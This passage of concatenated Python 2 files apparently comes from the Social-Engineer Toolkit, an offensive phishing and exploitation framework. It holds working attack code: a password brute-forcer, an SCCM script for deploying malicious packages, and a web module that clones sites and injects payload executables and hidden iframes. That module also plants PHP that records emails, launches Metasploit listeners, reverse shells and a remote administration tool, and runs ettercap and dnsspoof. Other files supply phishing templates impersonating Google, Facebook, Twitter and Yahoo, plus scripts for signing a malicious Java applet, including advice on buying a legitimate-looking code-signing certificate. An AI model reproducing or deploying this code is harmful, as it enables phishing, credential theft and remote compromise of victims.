                        print "[*] Successfully guessed password but needs changed. Username: %s with password of: %s" % (user,password)
                        filewrite.write("CHANGE PASSWORD NEEDED - username: %s password: %s\n" % (user, password))
                        success = True
                        child.kill(0)

                    if i ==8:
                        print "[!] Unable to connect to the server. Try again or check networking settings."
                        print "[!] Exiting RIDENUM..."
                        success = False
                        sys.exit()

        filewrite.close()
        # if we got lucky
        if success:
            print "[*] We got some accounts, exported results to %s_success_results_txt" % ip
            print "[*] All accounts extracted via RID cycling have been exported to %s_users.txt" % ip
        # if we weren't successful
        else:
            print "\n[!] Unable to brute force a user account, sorry boss."

    # exit out after we are finished
    sys.exit()

# except keyboard interrupt
except KeyboardInterrupt:
    print "[*] Okay, Okay... Exiting... Thanks for using rid_enum.py"

########NEW FILE########
__FILENAME__ = sccm_main
#!/usr/bin/python
from src.core.setcore import *
print "The" + bcolors.BOLD + " SCCM Attack Vector " + bcolors.ENDC + "will utilize the SCCM configurations to deploy malicious software. \n\nYou need to have the SMSServer name and a PackageID you want to package on the website. Then you need to copy this configuration file to the startup directory for all of the users on the server."

sms_server = raw_input("Enter the IP address or hostname of the SMS Server: ")
package_id = raw_input("Enter the Package ID of the package you want to patch: ")

configuration = '''
# configuration file written by Dave DeSimone and Bill Readshaw
# attack vector presented at Defcon 20
# added to set 07/27/2012

strSMSServer = "%s"
strPackageID = "%s"

Set objLoc =  CreateObject("WbemScripting.SWbemLocator")
Set objSMS= objLoc.ConnectServer(strSMSServer, "root\sms")
Set Results = objSMS.ExecQuery _
   ("SELECT * From SMS_ProviderLocation WHERE ProviderForLocalSite = true")
 For each Loc in Results
   If Loc.ProviderForLocalSite = True Then
     Set objSMS2 = objLoc.ConnectServer(Loc.Machine, "root\sms\site_"& _
        Loc.SiteCode)
     strSMSSiteCode = Loc.SiteCode
   end if
 Next

Set objPkgs = objSMS2.ExecQuery("select * from SMS_Package where PackageID = '" & strPackageID & "'")
for each objPkg in objPkgs
objPkg.RefreshPkgSource(0)
Next
''' % (sms_server, package_id)

# write out the file to reports
filewrite = file(setdir + "/reports/sccm_configuration.txt", "w")
filewrite.write(configuration)
filewrite.close()
print_status("The SCCM configuration script has been successfully created.")
print_status("You need to copy the script to the startup folder of the server.")
print_status("Report has been exported to %s/reports/sccm_configuration.txt" % (definepath))
pause = raw_input("Press " + bcolors.RED + "{return} " + bcolors.ENDC + "to exit this menu.")

########NEW FILE########
__FILENAME__ = fasttrack_http_server
#!/usr/bin/python
import os
import sys
definepath=os.getcwd()
sys.path.append(definepath)
from src.core.setcore import *
start_web_server_unthreaded(setdir + "/web_clone/")

########NEW FILE########
__FILENAME__ = spawn
#!/usr/bin/env python
import os
import sys
import re
import socket
import subprocess
from src.core.setcore import *
import thread
import SocketServer
import shutil
import re
import threading
import socket
import datetime

# see if we are tracking emails
track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()

# set current path
definepath=os.getcwd()

# check os
operating_system = check_os()

# set default value for automatic listener
automatic_listener = ""

if operating_system == "posix":
    try:
        import pexpect
    except ImportError:
        print_error("python-pexpect is not installed.. some things may not work.")
        return_continue()

# specify base msf_path
msf_path = ""

# see if we are using setshell
set_payload = ""
if os.path.isfile(setdir + "/set.payload"):
    fileopen = file(setdir + "/set.payload", "r")
    for line in fileopen: set_payload = line.rstrip()

##################################################################################
#
# Start of the SET Web Server for multiattack, java applet, etc.
#
##################################################################################

def web_server_start():
    # define if use apache or not
    apache=0
    # open set_config here
    apache_check = check_config("APACHE_SERVER=").lower()
    if apache_check == "on" or track_email == "on":
        apache_path = check_config("APACHE_DIRECTORY=")
        apache = 1
        if operating_system == "windows": apache = 0

    # specify the web port
    web_port = check_config("WEB_PORT=")

    # see if exploit requires webdav
    if os.path.isfile(setdir + "/meta_config"):
        fileopen=file(setdir + "/meta_config", "r")
        for line in fileopen:
            line=line.rstrip()
            match=re.search("set SRVPORT 80", line)
            if match:
                match2=re.search("set SRVPORT 8080", line)
                if not match2:
                    web_port=8080

    # check ip address
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input("Enter your ipaddress: ")

    # Grab custom or set defined
    if os.path.isfile(setdir + "/site.template"):
        fileopen=file(setdir + "/site.template","r").readlines()
        for line in fileopen:
            line=line.rstrip()
            match=re.search("TEMPLATE=", line)
            if match:
                line=line.split("=")
                template=line[1]

    # grab web attack selection
    if os.path.isfile(setdir + "/attack_vector"):
        fileopen=file(setdir + "/attack_vector","r").readlines()
        for line in fileopen:
            attack_vector=line.rstrip()

    # if it doesn't exist just set a default template
    if not os.path.isfile(setdir + "/attack_vector"):
        attack_vector = "nada"

    # Sticking it to A/V below
    import string,random
    def random_string(minlength=6,maxlength=15):
        length=random.randint(minlength,maxlength)
        letters=string.ascii_letters+string.digits
        return ''.join([random.choice(letters) for _ in range(length)])
    rand_gen=random_string()

    # check multiattack flags here
    multiattack_harv = "off"
    if os.path.isfile(setdir + "/multi_harvester"):
        multiattack_harv = "on"
    if os.path.isfile(setdir + "/multi_tabnabbing"):
        multiattack_harv = "on"

    # open our config file that was specified in SET
    if os.path.isfile(setdir + "/site.template"):
        fileopen=file(setdir + "/site.template", "r").readlines()
        # start loop here
        for line in fileopen:
            line=line.rstrip()
            # look for config file and parse for URL
            match=re.search("URL=",line)
            if match:
                line=line.split("=")
                # define url to clone here
                url=line[1].rstrip()

    # if we didn't create template then do self
    if not os.path.isfile(setdir + "/site.template"):
        template = "SELF"

    # If SET is setting up the website for you, get the website ready for delivery
    if template == "SET":

        # change to that directory
        os.chdir("src/html/")
        # remove stale index.html files
        if os.path.isfile("index.html"):
            os.remove("index.html")
        # define files and get ipaddress set in index.html
        fileopen=file("index.template", "r").readlines()
        filewrite=file("index.html", "w")
        if attack_vector == "java":
            for line in fileopen:
                match1=re.search("msf.exe", line)
                if match1: line=line.replace("msf.exe", rand_gen)
                match=re.search("ipaddrhere", line)
                if match:
                    line=line.replace("ipaddrhere", ipaddr)
                filewrite.write(line)
            # move random generated name
            filewrite.close()
            shutil.copyfile("msf.exe", rand_gen)

        # define browser attack vector here
        if attack_vector == "browser":
            counter=0
            for line in fileopen:
                counter=0
                match=re.search("Signed_Update.jar", line)
                if match:
                    line=line.replace("Signed_Update.jar", "invalid.jar")
                    filewrite.write(line)
                    counter=1
                match2=re.search("<head>", line)
                if match2:
                    if web_port != 8080:
                        line=line.replace("<head>", '<head><iframe src ="http://%s:8080/" width="100" height="100" scrolling="no"></iframe>' % (ipaddr))
                        filewrite.write(line)
                        counter=1
                    if web_port == 8080:
                        line=line.replace("<head>", '<head><iframe src = "http://%s:80/" width="100" height="100" scrolling="no" ></iframe>' % (ipaddr))
                        filewrite.write(line)
                        counter=1
                if counter == 0:
                    filewrite.write(line)
        filewrite.close()

    if template == "CUSTOM" or template == "SELF":
        # Bring our files to our directory
        if attack_vector != 'hid':
            if attack_vector != 'hijacking':
                print bcolors.YELLOW + "[*] Moving payload into cloned website." + bcolors.ENDC
                # copy all the files needed
                if not os.path.isfile(setdir + "/Signed_Update.jar"):
                    shutil.copyfile("%s/src/html/Signed_Update.jar.orig" % (definepath), "%s/Signed_Update.jar" % (setdir))
                shutil.copyfile(setdir + "/Signed_Update.jar", "%s/web_clone/Signed_Update.jar" % (setdir))
                if os.path.isfile("%s/src/html/nix.bin" % (definepath)):
                    nix = check_options("NIX.BIN=")
                    shutil.copyfile("%s/src/html/nix.bin" % (definepath), "%s/web_clone/%s" % (setdir, nix))
                if os.path.isfile("%s/src/html/mac.bin" % (definepath)):
                    mac = check_options("MAC.BIN=")
                    shutil.copyfile("%s/src/html/mac.bin" % (definepath), "%s/web_clone/%s" % (setdir, definepath, mac))
                if os.path.isfile(setdir + "/msf.exe"):
                    win = check_options("MSF.EXE=")
                    shutil.copyfile(setdir + "/msf.exe" , "%s/web_clone/%s" % (setdir,win))

                # pull random name generation
                print_status("The site has been moved. SET Web Server is now listening..")
                rand_gen = check_options("MSF_EXE=")
                if rand_gen != 0:
                    if os.path.isfile(setdir + "/custom.exe"):
                        shutil.copyfile(setdir + "/msf.exe", setdir + "/web_clone/msf.exe")
                        print "\n[*] Website has been cloned and custom payload imported. Have someone browse your site now"
                    shutil.copyfile(setdir + "/web_clone/msf.exe", setdir + "/web_clone/%s" % (rand_gen))
  
    # if docbase exploit do some funky stuff to get it to work right
    if os.path.isfile(setdir + "/docbase.file"):
        docbase=(r"""<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
         "http://www.w3.org/TR/html4/frameset.dtd">
        <HTML>
        <HEAD>
        <TITLE></TITLE>
        </HEAD>
        <FRAMESET rows="99%%, 1%%">
        <FRAME src="site.html">
        <FRAME name=docbase noresize borders=0 scrolling=no src="http://%s:8080">
        </FRAMESET>
        </HTML>""" % (ipaddr))
        if os.path.isfile(setdir + "/web_clone/site.html"): os.remove(setdir + "/web_clone/site.html")
        shutil.copyfile(setdir + "/web_clone/index.html", setdir + "/web_clone/site.html")
        filewrite=file(setdir + "/web_clone/index.html", "w")
        filewrite.write(docbase)
        filewrite.close()

    ####################################################################################################################################
    #
    # START WEB SERVER STUFF HERE
    #
    ####################################################################################################################################

    if apache == 0:
        if multiattack_harv == 'off':
            try:
            # specify port listener here
                import src.core.webserver as webserver                
                # specify the path for the SET web directories for the applet attack
                path = (setdir + "/web_clone/")
                try:
                    import multiprocessing
                    p = multiprocessing.Process(target=webserver.start_server, args=(web_port,path))
                    p.start()
                except Exception:
                    import thread
                    thread.start_new_thread(webserver.start_server, (web_port,path))

            # Handle KeyboardInterrupt
            except KeyboardInterrupt:
                exit_set()

            # Handle Exceptions
            except Exception,e:
                print e
                log(e)
                print bcolors.RED + "[!] ERROR: You probably have something running on port 80 already, Apache??"
                print "[!] There was an issue, printing error: " +str(e) + bcolors.ENDC
                print bcolors.ENDC + "Do you want to try to stop Apache? y/n"
                stop_apache = raw_input("Attempt to stop Apache? y/n: ")
                if stop_apache == "yes" or stop_apache == "y" or stop_apache == "":
                    subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
                    try:

                        # specify port listener here
                        import src.core.webserver as webserver
                        # specify the path for the SET web directories for the applet attack
                        path = (setdir + "/web_clone/")
                        p = multiprocessing.Process(target=webserver.start_server, args=(web_port,path))
                        p.start()

                    except Exception:
                        print bcolors.RED + "[!] UNABLE TO STOP APACHE! Exiting..." + bcolors.ENDC
                        sys.exit()

            # if we are custom, put a pause here to not terminate thread on web server
            if template == "CUSTOM" or template == "SELF":
                custom_exe = check_options("CUSTOM_EXE=")
                if custom_exe != 0:
                    while 1:
                        # try block inside of loop, if control-c detected, then exit
                        try:
                            print_warning("Note that if you are using a CUSTOM payload. YOU NEED TO CREATE A LISTENER!!!!!")
                            pause = raw_input(bcolors.GREEN + "\n[*] Web Server is listening. Press Control-C to exit." + bcolors.ENDC)

                        # handle keyboard interrupt
                        except KeyboardInterrupt:
                            print bcolors.GREEN + "[*] Returning to main menu." + bcolors.ENDC
                            break

    if apache == 1:
        subprocess.Popen("cp %s/src/html/*.bin %s 1> /dev/null 2> /dev/null;cp %s/src/html/*.html %s 1> /dev/null 2> /dev/null;cp %s/web_clone/* %s 1> /dev/null 2> /dev/null;cp %s/msf.exe %s 1> /dev/null 2> /dev/null;cp %s/Signed* %s 1> /dev/null 2> /dev/null" % (definepath,apache_path,definepath,apache_path,setdir,apache_path,setdir,apache_path,setdir,apache_path), shell=True).wait()
        # if we are tracking users
        if track_email == "on":
            now=datetime.datetime.today()
            filewrite = file("%s/harvester_%s.txt" % (apache_path,now), "w")
            filewrite.write("")
            filewrite.close()
            subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" % (apache_path,now), shell=True).wait()
            # here we specify if we are tracking users and such
            fileopen = file ("%s/index.html" % (apache_path), "r")
            data = fileopen.read()
            data = data.replace("<body>", """<body><?php $file = 'harvester_%s.txt'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (now))
            filewrite = file("%s/index.php" % (apache_path), "w")
            filewrite.write(data)
            filewrite.close()
            print_status("All files have been copied to %s" % (apache_path))

    #####################################################################################################################################
    #
    # END WEB SERVER STUFF HERE
    #
    #####################################################################################################################################

    if operating_system != "windows":
        # Grab metaspoit path
        msf_path=meta_path()
        import pexpect

# define if use apache or not
apache=0

# open set_config here
apache_check = check_config("APACHE_SERVER=").lower()
if apache_check == "on" or track_email == "on":
    apache_path = check_config("APACHE_DIRECTORY=")
    apache = 1
    if operating_system == "windows": apache = 0

web_server = check_config("WEB_PORT=")

# setup multi attack options here
multiattack="off"
if os.path.isfile(setdir + "/multi_tabnabbing"):
    multiattack="on"
if os.path.isfile(setdir + "/multi_harvester"):
    multiattack="on"

# Grab custom or set defined
template = ""
if os.path.isfile(setdir + "/site.template"):
    fileopen=file(setdir + "/site.template","r").readlines()
    for line in fileopen:
        line=line.rstrip()
        match=re.search("TEMPLATE=", line)
        if match:
            line=line.split("=")
            template=line[1]

# Test to see if something is running on port 80, if so throw error
try:
    web_port = check_config("WEB_PORT=")
    web_port=int(web_port)
    ipaddr=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ipaddr.connect(('127.0.0.1', web_port))
    ipaddr.settimeout(2)
    if ipaddr:
    # if apache isnt running and something is on 80, throw error
        if apache== 0:
            print_error("ERROR:Something is running on port %s. Attempting to see if we can stop Apache..." % (web_port))
            # if we are running windows then flag error (probably IIS or tomcat or something like that)
            if operating_system == "nt":
                exit_set()

            # if we are running posix then check to see what the process is first
            if operating_system == "posix":

                    # if we detect an apache installation
                    if os.path.isfile("/etc/init.d/apache2"):
                        apache_stop = raw_input("[!] Apache may be running, do you want SET to stop the process? [y/n]: ")
                        if apache_stop.lower() == "y" or apache_stop.lower() == "yes":
                            print_status("Attempting to stop apache.. One moment..")
                            # stop apache here
                            subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
                            try:
                                ipaddr.connect(('localhost', web_port))
                                if ipaddr:
                                    print_warning("If you want to use Apache, edit the config/set_config")
                                    print_error("Exit whatever is listening and restart SET")
                                    exit_set()

                            # if it couldn't connect to localhost, we are good to go and continue forward
                            except Exception:
                                print_status("Success! Apache was stopped. Moving forward within SET...")
                        # if we don't want to stop apache then exit SET and flag user
                        if apache_stop.lower() == "n" or apache_stop.lower() == "no":
                            print_warning("If you want to use Apache, edit the config/set_config and turn apache on")
                            print_error("Exit whatever is lsitening or turn Apache on in set_config and restart SET")
                            exit_set()
                    else:
                        print_warning("If you want to use Apache, edit the config/set_config")
                        print_error("Exit whatever is listening and restart SET")
                        exit_set()

        # if apache is set to run let the user know we are good to go
        if operating_system == "posix":
            if apache == 1:
                try:
                    web_port = check_config("WEB_PORT=")
                    web_port=int(web_port)
                    ipaddr=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ipaddr.connect(('127.0.0.1', web_port))
                    ipaddr.settimeout(2)
                    if ipaddr:
                        print_status("Apache appears to be running, moving files into Apache's home")

                except:
                    print_error("Exit whatever is listening and restart SET")
                    exit_set()

# except all issues and throw out to here
except Exception, e:

    # if we are using apache
    if apache == 1:
        print_error("Error:Apache does not appear to be running.")
        print_error("Start it or turn APACHE off in config/set_config")
        print_status("Attempting to start Apache manually...")
        apache_counter = 0

        if os.path.isfile("/etc/init.d/apache2"):
            subprocess.Popen("/etc/init.d/apache2 start", shell=True).wait()
            apache_counter = 1

        if os.path.isfile("/etc/init.d/httpd"):
            subprocess.Popen("/etc/init.d/httpd start", shell=True).wait()
            apache_counter = 1

        if apache_counter == 0:
            print_error("ERROR: Unable to start Apache through SET,")
            print_error("ERROR: Please turn Apache off in the set_config or turn it on manually!")
            print_error("Exiting the Social-Engineer Toolkit...")
            exit_set()

# except KeyboardInterrupt
except KeyboardInterrupt:
    print_warning("KeyboardInterrupt detected, bombing out to the prior menu.")

# grab metasploit root directory
if operating_system == "posix":
    msf_path=meta_path()

# Launch SET web attack and MSF Listener
try:
    if multiattack == "off":
        print (bcolors.BLUE + "\n***************************************************")
        print (bcolors.YELLOW + "Web Server Launched. Welcome to the SET Web Attack.")
        print (bcolors.BLUE + "***************************************************")
        print (bcolors.PURPLE+ "\n[--] Tested on Windows, Linux, and OSX [--]" + bcolors.ENDC)
        if apache == 1:
            print (bcolors.GREEN+ "[--] Apache web server is currently in use for performance. [--]" + bcolors.ENDC)

    if os.path.isfile(setdir + "/meta_config"):
        fileopen=file(setdir + "/meta_config", "r")
        for line in fileopen:
            line=line.rstrip()
            match=re.search("set SRVPORT 80", line)
            if match:
                match2=re.search("set SRVPORT 8080", line)
                if not match2:
                    if apache == 1:
                        print_warning("Apache appears to be configured in the SET (set_config)")
                        print_warning("You will need to disable Apache and re-run SET since Metasploit requires port 80 for WebDav")
                        exit_set()
                    print bcolors.RED + """Since the exploit picked requires port 80 for WebDav, the\nSET HTTP Server port has been changed to 8080. You will need\nto coax someone to your IP Address on 8080, for example\nyou need it to be http://172.16.32.50:8080 instead of standard\nhttp (80) traffic."""

    web_server_start()
    # if we are using ettercap
    if os.path.isfile(setdir + "/ettercap"):
        fileopen5=file(setdir + "/ettercap", "r")
        for line in fileopen5:
            ettercap=line.rstrip()
            # run in background
            ettercap=ettercap+" &"
            # spawn ettercap or dsniff
            subprocess.Popen(ettercap, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    # if metasploit config is in directory
    if os.path.isfile(setdir + "/meta_config"):
        print_info("Launching MSF Listener...")
        print_info("This may take a few to load MSF...")
        # this checks to see if we want to start a listener
        automatic_listener = check_config("AUTOMATIC_LISTENER=").lower()
        if automatic_listener != "off":
            try: reload(pexpect)
            except: import pexpect
            # specify if we are using the multi pyinjector
            meta_config = "meta_config"
            if os.path.isfile(setdir + "/meta_config_multipyinjector"):
                meta_config = "meta_config_multipyinjector"
            child1=pexpect.spawn("ruby %s/msfconsole -L -r %s/%s" % (msf_path,setdir,meta_config))
        # check if we want to deliver emails or track users that click the link
        webattack_email = check_config("WEBATTACK_EMAIL=").lower()
        if webattack_email == "on" or track_email == "on":
            try: reload(src.phishing.smtp.client.smtp_web)
            except: import src.phishing.smtp.client.smtp_web

        child1.interact()

    if os.path.isfile(setdir + "/set.payload"):
        port = check_options("PORT=")

        # grab configuration
        fileopen=file(setdir + "/set.payload", "r")
        for line in fileopen: set_payload = line.rstrip()

        if set_payload == "SETSHELL":
            print "\n"
            print_info("Launching the SET Interactive Shell...")
            try: reload(src.payloads.set_payloads.listener)
            except: import src.payloads.set_payloads.listener
        if set_payload == "SETSHELL_HTTP":
            print "\n"
            print_info("Launching the SET HTTP Reverse Shell Listener...")
            try: reload(src.payloads.set_payloads.set_http_server)
            except: import src.payloads.set_payloads.set_http_server

        if set_payload == "RATTE":
            print_info("Launching the Remote Administration Tool Tommy Edition (RATTE) Payload...")

            # prep ratte if its posix
            if operating_system == "posix":
                subprocess.Popen("chmod +x src/payloads/ratte/ratteserver", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                os.system("src/payloads/ratte/ratteserver %s" % (port))

            # if not then run it in windows
            if operating_system == "windows":
                if not os.path.isfile(setdir + "/ratteserver.exe"):
                    shutil.copyfile("../../payloads/ratte/ratteserver.binary", setdir + "/ratteserver.exe")
                    shutil.copyfile("../../payloads/ratte/cygwin1.dll", setdir + "/cygwin1.dll")
                    os.system(setdir + "/ratteserver %s" % (definepath,port))

# handle errors
except Exception, e:
    log(e)
    pass
    try:
        if apache == 1:
            raw_input(bcolors.ENDC +"\nPress [return] when finished.")
        child.close()
        child1.close()
        # close ettercap thread, need to launch from here eventually instead of executing
        # an underlying system command.
        if operating_system == "posix":
            subprocess.Popen("pkill ettercap 1> /dev/null 2> /dev/null", shell=True).wait()
            # kill dnsspoof if there
            subprocess.Popen("pkill dnsspoof 1> /dev/null 2> /dev/null", shell=True).wait()
            if apache == 1:
                subprocess.Popen("rm %s/index.html 1> /dev/null 2> /dev/null;rm %s/Signed* 1> /dev/null 2> /dev/null;rm %s/*.exe 1> /dev/null 2> /dev/null" % (apache_path,apache_path,apache_path), shell=True).wait()
    except:
        try:
            child.close()
        except:
            pass

except KeyboardInterrupt:
    sys.exit(1)


# if we turned automatic listener off
if automatic_listener == "off" or multiattack== "on":

    if automatic_listener == "off":
        print_warning("Listener is turned off in config/set_config!")
    if automatic_listener == "off" or template == "CUSTOM" or template == "SELF":

        while 1:
            try:
                print_warning("\n If you used custom imports, ensure you create YOUR OWN LISTENER!\nSET does not know what custom payload you used.")
                pause = raw_input("\nPress {control -c} to return to the main menu when you are finished.")
            except KeyboardInterrupt:
                break

if apache == 1:
    # if we are running apache then prompt to exit this menu
    print_status("Everything has been moved over to Apache and is ready to go.")
    return_continue()

# we stop the python web server when we are all finished
if apache == 0:
    # specify the web port
    web_port = check_config("WEB_PORT=")
    # stop the web server
    try: import src.core.webserver as webserver
    except: reload(src.core.webserver)
    webserver.stop_server(web_port)

# call the cleanup routine
cleanup = check_config("CLEANUP_ENABLED_DEBUG=")
if cleanup.lower() != "on":
    cleanup_routine()

########NEW FILE########
__FILENAME__ = template
#!/usr/bin/env python
import subprocess
import os
import shutil
import glob
from src.core.setcore import *

me = mod_name()
dest = "src/html/"

debug_msg(me,"entering src.html.templates.template'",1)

#
# used for pre-defined templates
#
print """
  1. Java Required
  2. Google
  3. Facebook
  4. Twitter
  5. Yahoo
"""
choice=raw_input(setprompt(["2"],"Select a template"))

if choice == "exit":
    exit_set()

# file used for nextpage in java applet attack
filewrite=file(setdir + "/site.template", "w")

# if nothing is selected
if choice == "": choice = "1"

# if java required
if choice == "1":
    if os.path.isfile("src/html/index.template"): os.remove("src/html/index.template")
    shutil.copyfile("src/html/templates/java/index.template", "src/html/index.template")
    URL=""

# if google
if choice == "2":
    if os.path.isfile("src/html/index.template"): os.remove("src/html/index.template")
    shutil.copyfile("src/html/templates/google/index.template", "src/html/index.template")
    URL="http://www.google.com"

# if facebook
if choice == "3":
    if os.path.isfile("src/html/index.template"): os.remove("src/html/index.template")
    for files in glob.glob('src/html/templates/facebook/*.*'): shutil.copy(files, "src/html/")
    URL="http://www.facebook.com"

# if twitter
if choice == "5":
    if os.path.isfile("src/html/index.template"): 
      os.remove("src/html/index.template")
    shutil.copyfile("src/html/templates/twitter/index.template", "src/html/index.template")
    URL="http://www.twitter.com"

# if yahoo
if choice =="6":
    if os.path.isfile("src/html/index.template"): os.remove("src/html/index.template")
    shutil.copyfile("src/html/templates/yahoo/index.template", "src/html/index.template")
    URL="http://mail.yahoo.com"

if not os.path.isdir(setdir + "/web_clone"):
    os.makedirs(setdir + "/web_clone/")
if os.path.isfile(setdir + "/web_clone/index.html"): os.remove(setdir + "/web_clone/index.html")
shutil.copyfile("src/html/index.template", setdir + "/web_clone/index.html")
filewrite.write("TEMPLATE=SELF" + "\n"+"URL=%s" % (URL))
filewrite.close()

debug_msg(me,"exiting src.html.templates.template'",1)

########NEW FILE########
__FILENAME__ = self_sign
#!/usr/bin/env python

import subprocess
import os
import sys
from src.core.setcore import *

#########################
# Simple signer for signing the java applet attack
#########################

# create Key: keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass mystorepass
# sign: jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass -signedjar SignedMicrosoft.jar oMicrosoft.jar signapplet

os.chdir("src/html/unsigned")

print """
 Simply enter in the required fields, easy example below:

 Name: FakeCompany
 Organization: Fake Company
 Organization Name: Fake Company
 City: Cleveland
 State: Ohio
 Country: US
 Is this correct: yes
"""

print_error("*** WARNING ***")
print_error("IN ORDER FOR THIS TO WORK YOU MUST INSTALL sun-java6-jdk or openjdk-6-jdk, so apt-get install openjdk-6-jdk")
print_error("*** WARNING ***")

# random string used to generate signature of java applet
random_string = generate_random_string(10, 30)

# grab keystore to use later
subprocess.Popen("keytool -genkey -alias %s -keystore mykeystore -keypass mykeypass -storepass mystorepass" % (random_string), shell=True).wait()

# self-sign the applet
subprocess.Popen("jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass -signedjar Signed_Update.jar unsigned.jar %s" % (random_string), shell=True).wait()

# move it into our html directory
subprocess.Popen("cp Signed_Update.jar ../", shell=True).wait()
subprocess.Popen("mv Signed_Update.jar " + setdir, shell=True)

# move back to original directory
os.chdir("../../../")
print_status("Java Applet is now signed and will be imported into the website")

########NEW FILE########
__FILENAME__ = verified_sign
#!/usr/bin/env python

import subprocess
import os
import sys
import shutil
from src.core.setcore import *

# keytool -import -storepass pw -alias MyCert -file mycert.spc
# jarsigner -verbose -storepass <pw> -keypass <pw> unsigned.jar MyCert

###########################################################
#                                                         #
# SET - Use codesigning for the java applet attack vector #
#                                                         #
###########################################################

# based on the new update to Java, this no longer works and just shows a big "UNKNOWN".
# to get around that you can purchase your own digital certificate through verisign/thawte

# grab current path
definepath = definepath()

# print warning message that we need to install sun-java or openjdk
print """
 This menu will allow you to import or create a valid code signing certificate for the Java Applet attack.

 You will need to purchase a code signing certificate through GoDaddy, Thawte, Verisign, etc. in order to
 make this work. This menu will automate the portions for you to either create the request to submit to the
 certificate authority or allow you to import a code signing certificate that you may already have.

 Note that purchasing a code signing certificate is somewhat difficult. It requires you to have a business name and
 prove the legitimacy of that certificate. That means you have to register a business with the state and everything else.

 Good news is, the process to do that is extremely simple. All in all, it should cost roughly around $300-350 to setup your
 business, buy a code signing certificate, and publish an applet to be whatever you want. You can also do a "DBA" or doing
 business as which is also much easier to use.
"""

print_error("*** WARNING ***")
print_error("IN ORDER FOR THIS TO WORK YOU MUST INSTALL sun-java6-jdk or openjdk-6-jdk, so apt-get install openjdk-6-jdk")
print_error("*** WARNING ***")

# use flag is in case someone already has a code signing certificate, in that case it bypasses the "no" answer
use_flag = 0

print """
[--------------------------------]
Initial Selection Process
[--------------------------------]

There are a few choice here, the first is do you want to import your own Java Applet that you've already signed. If you already have the certificate and want to use the SET applet, you can find an unsigned version under src/html/unsigned/unsigned.jar. If you want to use this menu, you can as well.

Option 1 will import your own SIGNED applet that you already have.
Option 2 will go through the process of either creating the code signing certificate to be submitted to the CA or allow you to import your own certificate. If you already have your certificate and want to have SET handle the signing, this is the option you want.

1. Import your own java applet into SET (needs to be SIGNED).
2. Either create a code-signing csr or use a code-signing certificate you already own.
"""
firstprompt = raw_input("Enter your choice [1-2]: ")
if firstprompt == "": firstprompt == "2"

# if we want to import our own java applet
if firstprompt == "1":
    newpath = raw_input("Enter the path to the .jar file: ")
    if not os.path.isfile(newpath):
        while 1:
            print_error("Unable to locate the file. Please try again.")
            newpath = raw_input("Enter the path to the .jar file: ")
            if os.path.isfile(newpath): break

    # import into SET
    print_status("Importing the applet into SET for weaponization...")
    shutil.copyfile(newpath, setdir + "/Signed_Update.jar.orig")
    shutil.copyfile(newpath, setdir + "/Signed_Update.jar")
    print_status("The applet has been successfully imported into SET.")

# if we want to either generate a certificate or use our own certificate this is it
if firstprompt == "2":
    # prompt for a different certificate
    prompt = raw_input(setprompt("0", "Have you already generated a code signing-certificate? [yes|no]")).lower()
    # if we selected yes if we generated a code signing certificate
    if prompt == "yes" or prompt == "y":
        # prompt the user to import the code signing certificate
        cert_path=raw_input(setprompt("0", "Path to the code signing certificate file (provided by CA)"))
        if not os.path.isfile(cert_path):
            # loop forever
            while 1 == 1:
                print_error("ERROR:Filename not found. Try again.")
                # re-prompt if we didn't file the filename
                cert_path=raw_input(setprompt("0", "Path to the .cer certificate file"))
                # if we find the filename then break out of loop
                if os.path.isfile(cert_path): break

        # here is where we import the certificate
        try:
            print_info("Importing the certificate into SET...")

            subprocess.Popen("keytool -import -alias MyCert -file %s" % (cert_path), shell=True).wait()
            # trigger that we have our certificate already and bypass the request process below
            use_flag = 1

        # exception here in case it was already imported before
        except: pass

    # this will exit the menu
    if prompt == "quit" or prompt == "q":
        use_flag = 0
        prompt = "yes"
        cert_path = ""
    # if we have a cert now or if we need to generate one
    if use_flag == 1 or prompt == "no" or prompt == "n":

        # if we selected no we need to create one
        if prompt == "no" or prompt == "n":
            # get the stuff ready to do it
            print_info("Generating the initial request for Verisign...")
            # grab input from user, fqdn
            answer1=raw_input(setprompt("0", "FQDN (ex. www.thisisafakecert.com)"))
            # grab name of organizaton
            answer2=raw_input(setprompt("0", "Name of the organization"))
            # grab two letter country code
            answer3=raw_input(setprompt("0", "Two letter country code (ex. US)"))
            # if blank, default to US
            if answer3 == "": answer3 = "US"
            # grab state
            answer4=raw_input(setprompt("0", "State"))
            # grab city
            answer5=raw_input(setprompt("0", "City"))
            # generate the request crl
            subprocess.Popen('keytool -genkey -alias MyCert -keyalg RSA -keysize 2048 -dname "CN=%s,O=%s,C=%s,ST=%s,L=%s"' % (answer1,answer2,answer3, answer4, answer5), shell=True).wait()
            print_info("Exporting the cert request to text file...")
            # generate the request and export to certreq
            subprocess.Popen("keytool -certreq -alias MyCert > %s/certreq.txt" % (definepath), shell=True).wait()
            print_status("Export successful. Exported certificate under the SET root under certreq.txt")
            print_warning("You will now need to pay for a code signing certificate through Verisign/Thawte/GoDaddy/etc.")
            print_warning("Be sure to purchase a code signing certificate, not a normal website SSL certificate.")
            print_info("When finished, enter the path to the .cer file below")
            # cert_path is used for the certificate path when generating

            cert_path = raw_input(setprompt("0", "Path for the code signing certificate file (.spc file)"))
            # if we can't find the filename
            if not os.path.isfile(cert_path):
                while 1 == 1:
                    print_error("ERROR:Filename not found. Please try again.")
                    # re-prompt if file name doesn't exist
                    cert_path = raw_input(setprompt("0", "Path to the .cer certificate file from Verisign"))
                    # if we detect file, then break out of loop
                    if os.path.isfile(cert_path): break

            # import the certificate
